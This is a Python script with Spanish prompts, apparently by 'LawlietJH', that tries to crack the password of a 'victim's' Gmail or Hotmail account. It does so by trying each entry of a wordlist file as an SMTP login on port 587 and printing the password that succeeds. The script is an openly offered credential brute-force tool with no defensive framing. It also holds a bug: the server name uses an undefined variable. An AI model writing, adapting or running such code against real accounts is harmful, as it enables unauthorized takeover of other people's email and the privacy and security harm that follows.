# -*- coding: utf-8 -*-
#                                                               
#        `7MM'""YMM  `7MMM.     ,MMF' .g8'""bgd       `7MM      
#          MM    `7    MMMb    dPMM .dP'     `M         MM      
#          MM   d      M YM   ,M MM dM'       ``7Mb,od8 MM  ,MP'
#          MMmmMM      M  Mb  M' MM MM           MM' "' MM ;Y   
#          MM   Y  ,   M  YM.P'  MM MM.          MM     MM;Mm   
#          MM     ,M   M  `YM'   MM `Mb.     ,'  MM     MM `Mb. 
#        .JMMmmmmMMM .JML. `'  .JMML. `"bmmmd' .JMML. .JMML. YA.
#                                                               
#                                                  By: LawlietJH

from BannerEMCrk import Banner
import os.path as path
import smtplib
import os

os.system('cls')

autor = "By: LawlietJH"
version = "v_1.0.2"

    #GMCrk - Banner Random
banner = str(Banner()+"\n\n\t\t [-] Obtener Contraseñas de Outlook o Gmail [-] \n\n")
print (banner)
 
Usuario = input("\n\n [+] Dirección de Correo de la Víctima: ")

	# Ejemplos de uso para endswitch: 
	# X.lower().endswith(('.png', '.jpg', '.jpeg')) 
    # Con esto busca si tiene alguna de esas extensiones la variable X.
    # Esto es útil si puede haber mas de una extension posible.
    # Se suple más fácil cuando solo se quiere validar una sola extensión .
    # Ejemplo: if '.txt' in X: El problema de esto es que eso lo puede tomar como
    # valido aunque se encontrara como en xt.txtxt esto no deberia ser valido :v
    # pero lo tomaria como valido.
    
    
if Usuario.lower().endswith('@gmail.com'):
	correo = "gmail"
elif Usuario.lower().endswith('@hotmail.com'):
	correo = "outlook"
else:
	print("\n\t\t [!] Correo No Valido.")
	os.system('Timeout /nobreak 02 > Nul')
	exit(0)


	#Se Pide El Diccionario
NombreA = input("\n [+] Preciona [Enter] o Pon Nombre Del Diccionario: ")

	#Comprobamos Si Existe El Diccionario
if path.exists(NombreA):
	Archivo = NombreA
elif NombreA == "":
	Archivo = "pwd.zion"
	print("\n\t [!] Se Usará El Diccionario Por Defecto: pwd.zion")
	os.system('Timeout /nobreak 02 > Nul')
	
	if not path.exists("pwd.zion"):
		print("\n\t [!] No Se Ha Creado El Diccionario pwd.zion.")
		os.system('Timeout /nobreak 02 > Nul')
		exit(0)
else:
	print("\n\t No se encontro el Diccionario: "+NombreA)
	print("\n\t [!] Se Usará El Diccionario Por Defecto: pwd.zion")
	Archivo = "pwd.zion"
	os.system('Timeout /nobreak 02 > Nul')
	
	if not path.exists("pwd.zion"):
		print("\n\t [!] No Se Ha Creado El Diccionario pwd.zion.")
		resp=input("\n\t [+] ¿Desea Crear Ahora? [S/N]: ")
		
		if resp == "":
			resp = "N"
			
		if resp == "S" or resp == "Si" or resp == "SI" or resp == "si":
			print("\n\t Se creará el archivo pwd.zion.")
			print("\n\t Puedes añadirle palabras desde bloc de notas.")
			Zion=open("pwd.zion","w")
			Zion.close
			os.system('Timeout /nobreak 02 > Nul')
			exit(0)
		else:
			os.system('Timeout /nobreak 02 > Nul')
			exit(0)


	#SMTP Puerto 587/TCP (Para Clientes de Correo)
smtpserver = smtplib.SMTP("smtp."+str(nombre)+".com", 587)
smtpserver.ehlo()
smtpserver.starttls()

	# Abrimos El Diccionario
Archivo = open(Archivo, "r")


print("\n\n [!] Intentando...\n\n\n")

for Pwd in Archivo:
	try:
		smtpserver.login(Usuario, Pwd)
		print (" ------> [!] Contraseña Encontrada: " + str(Pwd))
		os.system('Timeout /nobreak 03 > Nul')
		exit(0)
	except smtplib.SMTPAuthenticationError:
		print ("\t [*] Contraseña Incorrecta: " + str(Pwd))
	
os.system('Timeout /nobreak 03 > Nul')